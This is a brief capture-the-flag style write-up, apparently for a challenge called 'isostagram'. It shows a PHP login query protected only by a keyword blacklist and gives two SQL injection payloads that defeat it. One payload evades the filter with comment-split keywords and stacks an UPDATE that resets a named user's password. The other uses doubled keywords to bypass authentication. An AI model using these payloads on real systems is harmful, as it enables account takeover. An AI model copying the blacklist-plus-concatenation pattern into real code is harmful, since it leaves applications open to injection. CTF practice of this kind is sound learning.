# isostagram
sql injection


php src
```php
$blacklist = array("union", "select", "where", "and", "or");
$replace = array("", "", "", "", "");
$username = str_ireplace($blacklist, $replace, $username);
$password = str_ireplace($blacklist, $replace, $password);
$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
```
`kita0421`

payload
1. 
```SQL
' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--

```
2. 
```SQL
1' OORR '1' = '1' limit 1; --
```
